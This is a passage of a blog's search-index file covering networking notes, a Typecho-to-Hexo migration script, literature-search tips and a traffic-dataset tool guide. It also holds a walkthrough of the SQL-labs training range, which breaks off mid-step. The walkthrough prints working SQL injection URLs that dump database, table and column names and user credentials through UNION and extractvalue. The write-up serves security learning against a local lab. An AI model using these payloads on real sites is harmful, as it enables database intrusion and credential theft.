uot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[294,295]},&quot;v&quot;:&quot;TCP/IP参考模型&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[296,297]},&quot;v&quot;:&quot;地位：由于广泛应用成为事实上的国际标准&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[298,299]},&quot;v&quot;:&quot;首先出现的是协议，模型实际上是对已有协议的描述&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[300,301]},&quot;v&quot;:&quot;应用层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[302,303]},&quot;v&quot;:&quot;对应OSI的会话层、表示层和应用层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[304,305]},&quot;v&quot;:&quot;典型协议：HTTP、SMTP、DNS、RTP、Telnet&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[306,307]},&quot;v&quot;:&quot;传输层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[308,309]},&quot;v&quot;:&quot;对应OSI的传输层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[310,311]},&quot;v&quot;:&quot;典型协议：TCP、UDP&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[312,313]},&quot;v&quot;:&quot;网际层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[314,315]},&quot;v&quot;:&quot;对应OSI的网络层&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[316,317]},&quot;v&quot;:&quot;将分组发往任何网络，并为之独立地选择合适的路由，不保证分组有序到达，有序交付由高层负责&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[318,319]},&quot;v&quot;:&quot;定义了IP协议，eg：IPV4、IPV6&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[320,321]},&quot;v&quot;:&quot;网络接口层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[322,323]},&quot;v&quot;:&quot;对应OSI的数据链路层和物理层，表示与物理网络的接口&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[324,325]},&quot;v&quot;:&quot;指出主机必须使用某种协议与网络连接&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[326,327]},&quot;v&quot;:&quot;从主机或者结点接收IP分组，并把他们发送到指定的物理网络上&quot;}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[328,329]},&quot;v&quot;:&quot;TCP/IP模型与OSI模型对比&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[330,331]},&quot;v&quot;:&quot;相同&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[332,333]},&quot;v&quot;:&quot;都采取分层的体系结构，分层的功能大体相似&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[334,335]},&quot;v&quot;:&quot;基于独立的协议栈概念&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[336,337]},&quot;v&quot;:&quot;都可以解决异构网络的互联问题，实现不同厂家的计算机之间的通信&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[338,339]},&quot;v&quot;:&quot;不同&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[340,341]},&quot;v&quot;:&quot;OSI精确定义了服务、协议、接口这三个主要概念（最大贡献），TCP/IP没有明确区分&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[342,343]},&quot;v&quot;:&quot;OSI通用性良好，TCP/IP实际上是对已有协议的描述，不适用于其他非TCP/IP的协议栈&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[344,345]},&quot;v&quot;:&quot;TCP/IP考虑了多种异构网的互联问题，并把网际协议IP作为单独的层次，OSI则是后续在网络层中划分子层实现类似TCP/IP中IP的功能&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[346,347]},&quot;v&quot;:&quot;网络层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[348,349]},&quot;v&quot;:&quot;OSI支持无连接和面向连接&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[350,351]},&quot;v&quot;:&quot;TCP/IP只有无连接&quot;}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:5,&quot;p&quot;:{&quot;lines&quot;:[352,353]},&quot;v&quot;:&quot;传输层&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[354,355]},&quot;v&quot;:&quot;OSI支持面向连接&quot;},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:6,&quot;p&quot;:{&quot;lines&quot;:[356,357]},&quot;v&quot;:&quot;TCP/IP支持面向连接和无连接&quot;}]}]}]},{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:3,&quot;p&quot;:{&quot;lines&quot;:[358,359]},&quot;v&quot;:&quot;五层参考模型&quot;,&quot;c&quot;:[{&quot;t&quot;:&quot;heading&quot;,&quot;d&quot;:4,&quot;p&quot;:{&quot;lines&quot;:[360,361]},&quot;v&quot;:&quot;应用层、传输层、网络层、数据链路层、物理层&quot;}]}]}]}"></svg></div>]]></content>
+      
+      
+      <categories>
+          
+          <category> knowledge </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> network </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>《文献管理与信息分析》-MindMap</title>
+      <link href="/academic/11.html"/>
+      <url>/academic/11.html</url>
+      
+        <content type="html"><![CDATA[<p>经同学推荐，潦草地学习了中科大罗昭峰老师的<a href="https://www.icourse163.org/course/USTC-9002?from=searchPage&outVendor=zw_mooc_pcssjg_">《文献管理与信息分析》</a>课程。</p><p>并据此，绘制了相关的思维导图;O) 方便日后的回顾</p><h2 id="课程简介"><a href="#课程简介" class="headerlink" title="课程简介"></a>课程简介</h2><blockquote><p>这是一门提升个人学习能力 , 提升效率，节省时间的课程。<br>“助力科研,推动创新”是开设这门课程十多年来不变的初衷，但课程内容一直在改进。<br>课程内容包括三大模块，分别致力于：提升学习效率，提升科研效率，提升创新思维能力。<br>累计学员超过30多万，超过80所高校认可本课程的学分。2015年入选全国工程专业学位首批在线课程，2017年入选国家精品在线课程，2019年入选华东5校联盟推荐课程。</p></blockquote><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><ul><li><p><a href="https://www.processon.com/view/link/61b0b4370e3e74708a914e96">提升学习效率</a></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/academic/learn.png" alt="learn"></p></li><li><p><a href="https://www.processon.com/view/link/63f32293d2aa8b66bc1ff358">提升科研效率</a></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/academic/research.png" alt="research"></p></li><li><p><a href="https://www.processon.com/view/link/63f32293d2aa8b66bc1ff358">提升创新思维</a></p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/academic/innovation.png" alt="innovation"></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> academic </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mindmap </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>如何将数据从typecho迁移至hexo?</title>
+      <link href="/technique/10.html"/>
+      <url>/technique/10.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="备份typecho数据"><a href="#备份typecho数据" class="headerlink" title="备份typecho数据"></a>备份typecho数据</h2><p>将使用typecho搭建的网站数据库进行备份</p><h2 id="将备份的数据库文件在本地导入"><a href="#将备份的数据库文件在本地导入" class="headerlink" title="将备份的数据库文件在本地导入"></a>将备份的数据库文件在本地导入</h2><p>本地安装mysql以及数据库管理工具Navicat。使用Navicat新建本地连接，并新建typecho数据库，在typecho数据库中运行备份的sql文件，运行完成后即成功将相关的表和数据导入。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/tech/typecho_database.png" alt="typecho database"></p><h2 id="编写typecho数据转成Markdown的脚本"><a href="#编写typecho数据转成Markdown的脚本" class="headerlink" title="编写typecho数据转成Markdown的脚本"></a>编写typecho数据转成Markdown的脚本</h2><p>借鉴<a href="https://www.tinymind.net.cn/articles/f902089fb99b43">tanmx</a>的博客，使用pymysql模块，稍微修改后代码如下：</p><pre><code># -*- coding: utf-8 -*-import codecsimport os#import torndbimport pymysqlimport arrowdef create_data(cursor):    # 创建分类和标签    sql  = &quot;select type, slug, name from typecho_metas&quot;    cursor.execute(sql)    categories = cursor.fetchall()    print(categories)    for cate in categories:        path = &#39;data/%s&#39; % cate[1]        if not os.path.exists(path):            os.makedirs(path)        f = codecs.open(&#39;%s/index.md&#39; % path, &#39;w&#39;, &quot;utf-8&quot;)        f.write(&quot;---&quot;)        f.write(&quot;\n title: %s &quot; % cate[1])        f.write(&quot;\n date: %s&quot; % arrow.now().format(&#39;YYYY-MM-DD HH:mm:ss&#39;))        # 区分分类和标签        if cate[0] == &#39;category&#39;:            f.write(&#39;\n type: &quot;categories&quot;&#39;)        elif cate[0] == &#39;tags&#39;:            f.write(&#39;\n type: &quot;tags&quot;&#39;)        # 禁止评论        f.write(&quot;\n comments: true&quot;)        f.write(&quot;\n--- \n &quot;)        f.close()    # 创建文章    sql1 = &quot;select cid, title, slug, text, created from typecho_contents where type=&#39;post&#39;&quot;    cursor.execute(sql1)    entries = cursor.fetchall()    for e in entries:        title = e[1]        urlname = e[2]        print(title)        content = str(e[3]).replace(&#39;&lt;!--markdown--&gt;&#39;, &#39;&#39;)        tags = []        category = &quot;&quot;        # 找出文章的tag及category        sql2 = &quot;select type, name, slug from `typecho_relationships` ts, typecho_metas tm where tm.mid = ts.mid and ts.cid = &#123;&#125;&quot;.format(e[0])        cursor.execute(sql2)        metas = cursor.fetchall()        for m in metas:            if m[0] == &#39;tag&#39;:                tags.append(m[1])            if m[0] == &#39;category&#39;:                category = m[2]        path = &#39;data/_posts/&#39;        if not os.path.exists(path):            os.makedirs(path)        f = codecs.open(r&quot;%s%s.md&quot; % (path,title), &#39;w&#39;, &quot;utf-8&quot;)        f.write(&quot;---&quot;)        f.write(&quot;\n title: %s&quot; % title)        f.write(&quot;\n date: %s&quot; % arrow.get(e[4]).format(&#39;YYYY-MM-DD HH:mm:ss&#39;))        f.write(&quot;\n categories: %s&quot; % category)        f.write(&quot;\n tags: [%s]&quot; % &#39;,&#39;.join(tags))        f.write(&quot;\n urlname: %s&quot; % urlname)        f.write(&quot;\n--- \n&quot;)        f.write(content)        f.close()def main():    # 数据库连接信息    db = pymysql.Connection(host=&quot;127.0.0.1&quot;, database=&quot;typecho&quot;, user=&quot;你设置的用户名&quot;, password=&quot;用户名对应的密码&quot;)    #modified    cursor = db.cursor()    create_data(cursor)if __name__ == &quot;__main__&quot;:    main()</code></pre><h2 id="将生成的文件放入hexo博客目录"><a href="#将生成的文件放入hexo博客目录" class="headerlink" title="将生成的文件放入hexo博客目录"></a>将生成的文件放入hexo博客目录</h2><p>将data_posts中的.md文件放入source_posts目录下，<br>将data\下的其余文件夹（分类，即原来的typecho_metas数据）放入source\目录下</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>文献阅读技巧</title>
+      <link href="/academic/9.html"/>
+      <url>/academic/9.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="文献搜集方法"><a href="#文献搜集方法" class="headerlink" title="文献搜集方法"></a>文献搜集方法</h2><p>（1）平台：<br>国内：<a href="https://www.cnki.net/">中国知网</a>、<a href="http://www.cqvip.com/">维普</a>、<a href="https://www.wanfangdata.com.cn/index.html">万方</a><br>国外：<a href="https://scholar.google.com/">谷歌学术</a>、<a href="https://ieeexplore.ieee.org/Xplore/home.jsp">IEEE</a>、<a href="https://dl.acm.org/">ACM</a>、<a href="https://dblp.uni-trier.de/">dblp</a>、<a href="https://link.springer.com/">Springer</a>、<a href="https://singlelogin.org/">Z-library</a><br>网络安全领域四大顶会：Network and Distributed System Security Symposium(<a href="https://www.ndss-symposium.org/">NDSS</a>)、ACM Conference on Computer and Communications Security(<a href="https://www.sigsac.org/ccs.html">CCS</a>)、IEEE Symposium on Security &amp; Privacy(<a href="http://www.ieee-security.org/TC/SP-Index.html">S&amp;P</a>)、USENIX Security Symposium(<a href="https://www.usenix.org/conferences">USENIX</a>)</p><p>（2）辅助网站：<br><a href="https://sci-hub.shop/">Sci-hub</a>：根据URL、PMID或者doi号搜索对应文献，支持免费下载<br>谷歌学术镜像站：<a href="https://ac.scmor.com/">思谋</a>、<a href="http://scholar.hedasudi.com/">Google镜像</a></p><h2 id="文献管理工具"><a href="#文献管理工具" class="headerlink" title="文献管理工具"></a>文献管理工具</h2><p>国内：<br>①<a href="http://www.inoteexpress.com/">NoteExpress</a> ：符合中国人使用习惯，中文支持良好，与Word适配性比较好<br>国外：<br>①<a href="https://www.endnote.com/">EndNote</a>：界面简单，搜索查询方便，与Word无缝链接<br>②<a href="https://www.mendeley.com/?interaction_required=true">Mendeley</a>：适合用于阅读文献；chrome上有扩展可以直接采集网页论文（比如arxiv），不需要自己下载再导入；文献推送功能不错、pdf适配性好、高亮复制标注搜索等功能易操作<br>③<a href="https://www.zotero.org/">Zotero</a>：有group library，支持共享<br>④<a href="https://www.papersapp.com/">Papers</a></p><h2 id="文献阅读"><a href="#文献阅读" class="headerlink" title="文献阅读"></a>文献阅读</h2><p>以下为学习过程中的技巧总结以及他人的经验分享</p><p>（1）中文论文论文阅读</p><p>因为我们的母语为中文，先阅读中文论文，可以对待研究领域的基本概念、基础知识和常见技术等有一个快速的了解。优先选择的类型为硕博论文和综述类论文，并选择近几年发表的论文。其中，硕博论文包含其研究内容的系统介绍，可以帮助我们了解对应领域的常见研究方法，综述类篇幅小于硕博论文，也是对某一研究领域的系统介绍，可以选择计算机学报、中文信息学报、软件学报、电子学报等较高水平学报期刊发表的综述。</p><p>（2）英文论文阅读</p><p>一般最新和最好的研究成果都发布在高水平的期刊和会议上，因此需要首先进行筛选，一种方法是选择发表在研究领域的顶级会议和顶级期刊上的论文，另一种方式是借助其他工具判断论文的水平。这里推荐的两个工具，一是<a href="https://www.letpub.com.cn/index.php?page=journalapp&view=search">Let-Pub，SCI查询与投稿分析系统</a>，通过该网站可以判断论文是否被SCI、EI、中文核心期刊收录，二是提供论文等级显示的浏览器扩展，例如名字为<a href="https://github.com/WenyanLiu/CCFrank4dblp">CCFrank</a>的Chrome浏览器扩展（PS：作者一直在更新，大家有什么需求快去issue），该扩展适用于dblp、谷歌学术、Connected Papers 和 Web of Science ，在搜索结果页显示CCF等级（中国计算机学会推荐国际学术会议和期刊目录的分级）。<img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/papers/ccfrank_result.png" alt="搜索结果显示"><br>另一个<a href="https://chrome.google.com/webstore/detail/show-conferencejournal-ra/hcfmpekcjhpfcokagmhnhldpacknikim?utm_source=chrome-ntp-icon">显示会议&#x2F;期刊等级</a>除dblp和谷歌学术，还支持IEEE xplore、ACM和Springer。<br>如果需要综述类论文，搜索关键词为survey、overview。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> academic </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>USTC-TK2016工具使用教程</title>
+      <link href="/technique/8.html"/>
+      <url>/technique/8.html</url>
+      
+        <content type="html"><![CDATA[<p>工具下载地址：<a href="https://github.com/yungshenglu/USTC-TK2016">USTC-TK2016</a>  ps：使用git较zip下载更好</p><p>该工具的github README中有基本的安装和使用步骤，针对不同的运行环境会有一些小问题，以下是本人参考<a href="https://blog.csdn.net/u010916338/article/details/86511009">博文</a>后重新整理的安装使用教程</p><p><strong>环境</strong></p><p>Windows 10操作系统<br>python 3.7<br>powershell 5.1<br>splitcap </p><h2 id="Git安装"><a href="#Git安装" class="headerlink" title="Git安装"></a>Git安装</h2><p>①windows安装git：<a href="https://git-scm.com/download/win">下载地址</a>，根据网上的安装教程进行安装，安装步骤中大部分设置为默认<br>②打开Git Bash，进入自己的工作目录，然后输入以下对应的git clone命令</p><pre><code># Clone the repository on &quot;master&quot; branch$ git clone -b master https://github.com/yungshenglu/USTC-TK2016</code></pre><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>(1) 将pcap数据集放入1_Pcap文件夹</p><p>(2)执行1_Pcap2Session.ps1文件：</p><p>①ps1文件需要在powershell中运行，Windows 10系统自带powershell。在任务栏中搜索powershell并点击右键使用管理员权限运行；</p><p>②在powershell中输入<code>set-executionpolicy remotesigned</code>，更改执行策略;<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/traffic_tool/powershell_config.png" alt="powershell_config"></p><p>③如果将pcap文件按照session切割，将1_Pcap2Session.ps1文件的第10和第14行取消注释，第11行和第15行注释掉；如果将pcap文件按照flow切割，与前面恰好相反；<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/traffic_tool/1_code.png" alt="code"></p><p>④在powershell中进入USTC-TK2016目录，输入<code>.\1_Pcap2Session.ps1</code>尝试运行ps1文件，出现：<code>处理的异常: System.TypeInitializationException: &quot;SplitCap.Program&quot;的类型初始值设定项引发异常。</code>和<code>USTC-TK2016\2_Session\AllLayers\…找不到指定文件</code>的错误。前者是由于Splitcap版本过低导致的，在splitcap下载地址：<a href="https://www.netresec.com/?page=SplitCap">link</a>中下载最新版本的splitcap，将exe文件放入原来的0_Tool\SplitCap_2-1文件夹下，删除原来的SplitCap.exe文件，或者在ps1文件中修改代码；后者按照源代码中的输出文件格式<code>2_Session\AllLayers\$($f.BaseName)-ALL</code>和<code>2_Session\AllLayers\$($f.BaseName)-L7</code>（变量是pcap文件除去文件后缀的文件名），手动在指定目录下创建对应的文件夹</p><p>⑤再次运行，执行成功后在<code>2_Session\AllLayers\</code>和<code>2_Session\L7\</code>目录下会有对应的pcap文件</p><p>(3) 执行2_ProcessSession.ps1文件：</p><p>①打开ps1文件，将需要处理的源文件目录变量修改为：<code>$SOURCE_SESSION_DIR = &quot;2_Session\L7&quot;</code>或者<code>$SOURCE_SESSION_DIR = &quot;2_Session\AllLayers&quot;</code>，即上一步数据切割后保存的文件目录<br>②根据ps1文件中的以下代码手动创建对应的文件夹</p><pre><code>$paths = @((&#39;3_ProcessedSession\FilteredSession\Train&#39;, &#39;3_ProcessedSession\TrimedSession\Train&#39;), (&#39;3_ProcessedSession\FilteredSession\Test&#39;, &#39;3_ProcessedSession\TrimedSession\Test&#39;))</code></pre><p>③输入<code>.\2_ProcessSession.ps1</code>尝试运行ps1文件，执行成功后</p><pre><code>FilteredSession\ - Get the top 60000 large PCAP filesTrimedSession\ - Trim the filtered PCAP files into size 784 bytes (28 x 28) and append 0x00 if the PCAP file is shorter than 784 bytesThe files in subdirectory Test\ and Train\ is random picked from dataset.</code></pre><p>(4) 执行3_Session2Png.py文件：</p><p>①命令行输入<code>python 3_Session2Png.py</code>运行，生成的图片保存在4_Png目录下；</p><p>②运行时报错：<code>TypeError: slice indices must be integers or None or have an __index__ method</code>，根据报错提示查看对应的代码<code>fh = numpy.reshape(fh[:rn*width],(-1,width)) </code>，因为[]中的数据变成了浮点数，不能作为数组的下标，需要将其强制转换为int型，修改为<code>fh = numpy.reshape(fh[:int(rn*width)],(-1,width)) </code>，或者因为rn的值源于前面的<code>rn = len(fh)/width</code>，这里除法保留了小数部分，所以需要将单斜杠变为双斜杠只保留整数部分</p><p>(5) 执行4_Png2Mnist.py文件：</p><p>①原文件的注释中要求python&gt;2.5，代码中的print函数使用表明为python2环境，需要修改print语句为python3版本</p><p>②如果需要添加print语句测试某些变量，在增加代码时会遇到缩进的问题，因为Git的代码通常会出现4个空格和tab键不匹配问题，可以参考<a href="https://blog.csdn.net/hhy_csdn/article/details/82263757">link</a>进行修改</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL-labs过关笔记</title>
+      <link href="/technique/7.html"/>
+      <url>/technique/7.html</url>
+      
+        <content type="html"><![CDATA[<p>SQL-labs靶场搭建；<br>①docker搭建：<a href="https://blog.csdn.net/qq_39670065/article/details/106762824?utm_medium=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control">参考链接</a>，博文还提供通关指南<br>②本地搭建：Github<a href="https://github.com/Audi-1/sqli-labs">链接</a>，将下载后的文件夹放入phpstudy中的www目录下，开启phpstudy的Apache和mysql服务，之后就可以通过<code>http://本机ip/sqli-labs</code> 访问靶场进行关卡选择</p><p>过关参考（<strong>部分</strong>）：<br>对于一般的靶场实验要求，主要的步骤为：测试是否存在SQL注入，寻找注入点-&gt;爆库名、表名、列名、记录<br>一些不同的关卡通关方式也比较类似，所以针对相同的一些步骤这里只进行简要说明。<br>1、Less-1<br>(1)根据提示“Please input the ID as parameter with numeric value”可知为GET方法，数据在URL中，所以构造URL：<code>http://127.0.0.1/sqli-labs/Less1/?id=1 || 2</code> 并访问，如下显示 id 对应用户名和密码：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.1.png" alt="Less-1.1"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.2.png" alt="Less-1.2"><br>(2)构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=2-1</code> 并访问，显示 id&#x3D;2 的用户信息页面，证明该注入点并非数字型注入<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.3.png" alt="less-1.3"><br>(3)构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=2&#39;</code> 并访问，页面返回了SQL语法报错信息，证明单引号已经拼接到后台SQL语句中，起到了闭合作用，并影响了后台SQL查询行为<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.4.png" alt="less-1.4"><br>(4)构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; --+</code>访问，前者页面返回了数据库报错信息，后者页面返回正常，又–+在数据库中表示注释，猜测该系统后台SQL查询语句应该类似于如下语句：<br>    SELECT username, password FROME t_user WHERE UserID &#x3D; ‘1’ LIMIT 0,1<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.5.png" alt="less-1.5"><br>(5)通过ORDER BY判断表的列数，因为 ORDER BY num 通过按第num列将元组排序，当num超过列数时返回错误信息，所以可以通过它判断表的列数，提交的URL格式为： <code>http://127.0.0.1/sqli-labs/Less-1/?id=1&#39; ORDER BY num--+</code>，将 ORDER BY 的数字num从2逐步增大到3页面返回正常，直到增大为4时页面返回报错信息”Unknown column”，表明数据表的列数为3列：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.6.png" alt="less-1.6"><br>(6)找注入点：将 id&#x3D;1 改为一个数据库不存在的 id 值，如-1，因为不存在 id 为-1 的所以前面的查询为空(也可以使用id&#x3D;1 and 1&#x3D;2，只要保证联合查询前者为空)，通过联合查询显示后面的查询结果。因为已得出有三列，使用 union select 1,2,3 联合查询语句查看页面是否有显示位，构造的 URL 如下：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,3--+</code>，返回页面表明有两个显示位，分别显示了数字 2、3，可通过这两个显示位爆出需要的数据，界面如下：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.7.png" alt="less-1.7"><br>(7)爆库名：构造URL ： <code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; UNION SELECT 1,database(),3--+</code>，在第二个显示位得到数据库名称位security，如图：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.8.png" alt="less-1.8"><br>(8)爆表名：构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code>，其中information_schema是所有数据库中都存在的表，通过group_concat把所有的表名从information_schema 中查询出，爆出库中的有 4 张表:emails,referers,uagents,users，猜测其中用户名表名为 users，如下图：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.9.png" alt="less-1.9"><br>(9)爆列名：构造URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code>，爆出列名有 id、username、password，如图：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.10.png" alt="less-1.10"><br>(10)爆记录：对关心的用户名和密码进行爆破，构造如下URL：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,2,group_concat(username,&quot;:&quot;,password) from users--+</code> ，其中”:”整体可以替换为十六进制表示的 0x3a，同样能被MySQL识别，如图：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.11.png" alt="less-1.11"></p><p>2、Less-2<br>经尝试猜测的后台SQL语句如下：</p><pre><code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code></pre><p>所以构造URL时不需要单引号等等这些闭合手段，其余和关卡一类似<br>3、Less-3<br>经尝试猜测的后台SQL语句如下：</p><pre><code>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code></pre><p>所以构造URL时使用’)闭合，其余步骤类似</p><p>4、Less-4<br>经尝试猜测后台的SQL语句如下：</p><pre><code>SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1</code></pre><p>所以构造URL时使用”)闭合，和关卡3类似</p><p>5、Less-5<br>单引号闭合，和关卡6类似，在关卡6进行详细说明</p><p>6、Less-6<br>(1)首先按照提示在url中输入<code>?id=1</code>观察发现无login name和password回显<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.1.png" alt="less-6.1"><br>(2)构造 <code>URL：http://127.0.0.1/sqli-labs/Less-6/?id=1&#39;</code>并访问，页面正常说明单引号没有拼接到后台 SQL 语句，再使用双引号闭合页面提示SQL语句语法错误，说明双引号被拼接到后台<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.2.png" alt="less-6.2"><br>(3)构造 URL：<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot; ORDER BY 2--+</code>，数字增大为 4 时页面返回报错信息，表明数据表的列数为3列<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.3.png" alt="less-6.3"></p><p><strong>爆破：</strong>由于没有回显位，所以使用extractvalue(xml_frag,xpath_expr)函数，其中字符串参数：XML标记片段 xml_frag和XPath表达式 xpath_expr（也称为定位器）; 它返回CDATA第一个文本节点的text()，该节点是XPath表达式匹配的元素的子元素。当xpath格式错误时，函数的报错信息显示XPATH syntax error:第二个参数的信息&#x2F;执行结果。所以可以利用这个函数的特性，将想要获得的数据库内容放在第二个参数的位置，通过报错信息显示出来。（updatexml函数也有类似效果）<br>(4)爆库名：构造 URL：<code>http://127.0.0.1/sqli-labs/Less-6/?id=1&quot;and extractvalue(1,concat(0x23,database(),0x23))--+</code>，concat函数可用可不用，将#和想要获取数据库的数据库内容用concat连接起来只是为了突出显示，也可以单独extractvalue(1,database())<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.4.png" alt="less-6.4"><br>(5)爆表名：构造URL: 